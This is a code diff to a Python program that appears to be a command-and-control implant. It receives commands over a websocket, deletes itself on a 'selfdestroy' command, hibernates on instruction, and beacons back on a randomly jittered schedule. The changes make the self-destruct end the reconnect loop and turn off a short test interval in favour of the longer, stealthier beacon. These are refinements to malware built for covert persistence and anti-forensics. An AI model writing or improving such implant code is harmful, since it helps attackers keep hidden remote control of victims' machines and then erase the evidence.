@@ -13,6 +13,7 @@ import socket
 
 hibernate_time = False
 device_us = socket.gethostname()
+destroyed = False
 
 def on_message(ws, message): 
     global hibernate_time 
@@ -47,6 +48,8 @@ def on_message(ws, message):
 
         elif command == "selfdestroy":
             try:
+                global destroyed
+                destroyed = True
                 ws.close()
                 os.remove(__file__)
             except:
@@ -217,6 +220,8 @@ def monitor():
 if __name__ == "__main__":
     #websocket.enableTrace(True)
     while True:
+        if destroyed == True:
+            break
         connect()
         if hibernate_time != False:#se la var globale non è False, addormentati
             time.sleep(hibernate_time)
@@ -239,7 +244,7 @@ if __name__ == "__main__":
             jitter = random.uniform(400, 600)
             lookup = base * jitter
 
-        lookup = 5 #REMOVE OUT OF TESTING
+        #lookup = 5 #REMOVE OUT OF TESTING
 
         print(lookup)
         time.sleep(lookup)
